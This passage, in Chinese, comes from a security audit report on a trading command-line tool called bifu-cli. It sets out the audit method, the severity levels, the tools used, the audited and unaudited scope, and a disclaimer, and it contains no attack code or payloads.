本次审计采用五阶段审计模型：侦察与排除 → 并行模式匹配扫描 → 关键路径手工审计 → 漏洞验证与攻击链 → 报告输出。审计覆盖 10 个安全维度\(D1\-D10\)，采用三轨并行审计策略：

- Sink\-driven（污点追踪）: 追踪用户输入到危险函数的数据流，覆盖注入/SSRF/文件操作等维度

- Control\-driven（控制流审计）: 枚举端点验证权限控制完整性，覆盖授权/业务逻辑维度

- Config\-driven（配置审计）: 检查认证/加密/部署配置，覆盖认证/加密/配置/供应链维度

审计采用双轮迭代机制：第一轮广度扫描覆盖所有维度，第二轮针对第一轮识别的薄弱区域进行深度数据流追踪。每轮结束后执行三问法则终止评估，确保审计完整性。

审计完成后，所有发现均经过独立的人工复审验证流程：逐条打开漏洞涉及的源代码文件，阅读实际代码确认漏洞是否真实存在，标记为 confirmed（确认）、false\-positive（误报）、needs\-context（需运行时验证）等结论。仅经人工确认的漏洞纳入最终报告，误报在附录E中列出排除原因。

## 附录B — 严重性等级定义

**Critical: **可远程利用，直接导致系统沖陷或资金损失，无需认证或认证可被轻易绕过。利用复杂度低。

**High: **可造成严重业务影响，利用条件简单。需要少量前置条件（如网络可达特定端口）。

**Medium: **需要特定条件才能利用（如特定配置/时序/权限组合），或影响范围有限。

**Low: **安全卫生问题，不可直接利用。改善后可增强整体安全态势。

**Info: **安全建议或观察，非漏洞。提供安全改进方向参考。

## 附录C — 审计工具与技术

- 静态应用安全测试 \(SAST\)

- 代码模式匹配分析

- 手工数据流与污点追踪

- 依赖组件安全扫描

- 攻击链建模与验证

## 附录D — 审计范围与限制声明

### 已审计范围

- cmd/\* 全部 cobra 命令（auth/config/contract/forex/mcp/orion/payment/spot/ws/upgrade/skills）

- internal/mcp/server\.go（MCP stdio 服务端，主入站攻击面）

- internal/client/client\.go \+ websocket\.go（HTTP/WS 客户端）

- internal/clifconfig/config\.go（凭据存储）

- internal/api/\{spot,contract,payment,orion,meta\}（交易 API 层）

- install\.sh、npm/install\.js、npm/bin/bifu\-cli\.js（分发安装链）

- \.goreleaser\.yaml、\.github/workflows/\{ci,release,pages\}\.yml（CI/发布链）

- go\.mod / go\.sum（依赖供应链）

### 未审计范围

- BifuFX 后端服务端代码（不在本仓库，客户端仅消费 API）

- 运行时动态行为（除重定向 PoC 与 govulncheck 外未做完整黑盒测试）

- 第三方 AI 客户端（Claude Desktop/Cursor）自身的 prompt\-injection 防护

免责声明：本报告基于审计时点的静态代码分析，不保证发现所有安全漏洞。报告中的修复建议仅供参考，实际修复方案应结合项目具体情况由开发团队决定。安全审计是持续性工作，建议在重大版本更新后重新执行审计。

## 附录E — 复审排除清单

以下漏洞在初审中被标记，但经人工复审验证后判定为误报，已从正式报告中排除。列出排除原因以供参考。

